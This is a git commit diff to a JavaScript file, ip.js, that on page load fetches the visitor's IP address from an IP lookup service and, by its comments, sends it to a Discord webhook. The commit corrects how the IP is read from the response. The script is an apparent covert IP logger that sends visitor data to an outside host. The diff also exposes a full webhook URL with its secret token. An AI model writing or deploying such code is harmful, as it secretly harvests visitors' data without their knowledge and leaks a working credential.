fb3ffc90c2cbb2cc0442a12626af0d91b1f8ee25
TbeyazT <119758439+TbeyazT@users.noreply.github.com>
2023-12-10 14:42:15 +0300

    Update ip.js

--- ip.js
+++ ip.js
@@ -2,7 +2,7 @@ $(document).ready(function() {
     // Fetch IP information from ip-api.com on page load
     $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {  
       // Send IP information to Discord webhook
-      var ipAddress = data; // Assuming 'query' contains the IP address
+      var ipAddress = data.ip; // Assuming 'query' contains the IP address
       var discordWebhookURL = 'https://discord.com/api/webhooks/1183352632962719804/CBtTKAuz9fPxJx3epHcV4H40R50nNEBAwPUzgw0HF7GEaReV1KnHPj2lY6AFVBACOQfj';
   
       // Create the payload to send to Discord
